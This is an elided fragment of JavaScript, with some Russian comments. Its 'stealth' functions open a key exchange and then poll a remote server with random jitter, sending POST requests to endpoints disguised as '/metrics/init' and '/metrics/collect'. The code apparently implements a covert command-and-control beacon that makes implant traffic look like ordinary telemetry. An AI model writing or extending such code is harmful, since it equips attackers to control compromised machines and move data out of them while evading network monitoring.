...
const STEALTH_INIT_PATH = '/api/v1/metrics/init';
const STEALTH_POLL_PATH = '/api/v1/metrics/collect';
...
async function _stealthInit() {
  ...
  _stealthInitPromise = (async () => {
    try {
      ...
      const resp = await fetch(STEALTH_HTTP_BASE_URL + STEALTH_INIT_PATH, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Client-Public-Key': clientPublicKeyB64 // Send public key in header
        },
...
async function _stealthHttpSend(obj) {
  ...
  const resp = await fetch(STEALTH_HTTP_BASE_URL + STEALTH_POLL_PATH, {
    method: 'POST',
    headers: {
...
function _startHttpPolling() {
  ...
  // Поллинг: ping с джиттером
  const jitter = Math.floor(Math.random() * 2000); // 0-2 секунды джиттера
